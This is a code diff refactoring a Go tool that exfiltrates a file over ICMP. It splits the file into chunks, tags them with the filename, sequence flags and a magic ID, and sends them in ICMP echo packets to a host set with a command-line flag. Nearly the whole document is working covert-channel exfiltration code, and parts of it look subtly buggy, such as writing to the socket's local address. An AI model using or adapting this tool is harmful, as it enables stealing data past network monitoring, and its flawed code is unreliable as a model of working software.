@@ -7,13 +7,13 @@ import (
 	"io"
 	"log"
 	"os"
+	"path/filepath"
 
 	"golang.org/x/net/icmp"
 	"golang.org/x/net/ipv4"
 )
 
 const BUFFERSIZE = 512
-const MAXPAYLOAD = 1472
 const MAGIC = 0xA00A
 const FIRSTFLAGMASK = 0x01
 const LASTFLAGMASK = 0x02
@@ -24,10 +24,6 @@ type exfil struct {
 	last     bool
 	filename string
 	data     []byte
-}
-
-func initExfil() exfil {
-	return exfil{false, false, "", nil}
 }
 
 func buildFlags(pak exfil) byte {
@@ -77,10 +73,11 @@ func main() {
 	var file = flag.String("f", "", "the file to exfiltrate via ICMP")
 	var debug = flag.Bool("d", false, "enable debug output")
 	var help = flag.Bool("h", false, "show help.")
-	var host = flag.String("l", "127.0.0.1", "the location ip to send the file too")
+	var host = flag.String("l", "127.0.0.1", "the location ip to send the file to")
 
 	flag.Parse()
 
+	// Print help
 	if *help || len(os.Args) == 1 {
 		flag.PrintDefaults()
 		return
@@ -90,47 +87,58 @@ func main() {
 	f, err := os.Open(*file)
 	if err != nil {
 		log.Fatalln(err)
+		return
 	}
 	defer f.Close()
 
-	packet := initExfil()
-	packet.first = true
-	packet.filename = *file
-
+	// make file buffer
 	buf := make([]byte, BUFFERSIZE)
 
-	var fullPak = icmp.Message{Type: ipv4.ICMPType(IPV4ICMP), Code: 1, Checksum: 0, Body: nil}
-	var echoPak = icmp.Echo{ID: MAGIC, Seq: 0, Data: nil}
-	var fileError error = nil
-	var bytesRead int = 0
-	socket, err := icmp.ListenPacket("ip4:icmp", *host)
-	echoPak.ID = MAGIC
-	echoPak.Seq = 0
-	echoPak.Data = nil
+	// Initialize data packet
+	exfilPak := exfil{true, false, filepath.Base(*file), buf}
+	echoPak := icmp.Echo{ID: MAGIC, Seq: 0, Data: nil}
+	fullPak := icmp.Message{Type: ipv4.ICMPType(IPV4ICMP), Code: 1, Checksum: 0, Body: &echoPak}
 
-	if *debug {
-		fmt.Printf("flags bytes: %x\n", buildFlags(packet))
-		fmt.Printf("(bytes)filename length: %x\n", len(*file))
-		fmt.Printf("file name bytes: %x\n", *file)
+	// open up the "socket"
+	socket, sockErr := icmp.ListenPacket("ip4:icmp", *host)
+	if sockErr != nil {
+		log.Fatalln(sockErr)
+		return
 	}
+	var b, pak = []byte(nil), []byte(nil)
 
+	// if the file is big enough, keep sending data
 	for {
-		bytesRead, fileError = f.Read(buf)
+		bytesRead, fileError := f.Read(buf)
 		if fileError == io.EOF {
 			break
 		}
-		packet.data = buf[0:bytesRead]
+		exfilPak.data = buf[0:bytesRead]
 		if *debug {
-			fmt.Printf("(bytes)length of data: %x\n", bytesRead)
-			fmt.Printf("bytes just read: %x\n", buf[0:bytesRead])
+			fmt.Printf("buffer contents:\n%s\n", buf)
 		}
-		pak := buildExfilPacket(packet)
+		if bytesRead < BUFFERSIZE {
+			break
+		}
+		pak := buildExfilPacket(exfilPak)
 		echoPak.Data = pak
 		fullPak.Body = icmp.MessageBody(&echoPak)
-		b, _ := fullPak.Marshal(nil)
+		b, marshErr := fullPak.Marshal(nil)
+		if marshErr != nil {
+			log.Fatalln(marshErr)
+			return
+		}
 		socket.WriteTo(b, socket.LocalAddr())
 		echoPak.Seq += 1
+		exfilPak.first = false
 	}
 
+	// last iteration
+	exfilPak.last = true
+	pak = buildExfilPacket(exfilPak)
+	echoPak.Data = pak
+	fullPak.Body = icmp.MessageBody(&echoPak)
+	b, _ = fullPak.Marshal(nil)
+	socket.WriteTo(b, socket.LocalAddr())
 	return
 }
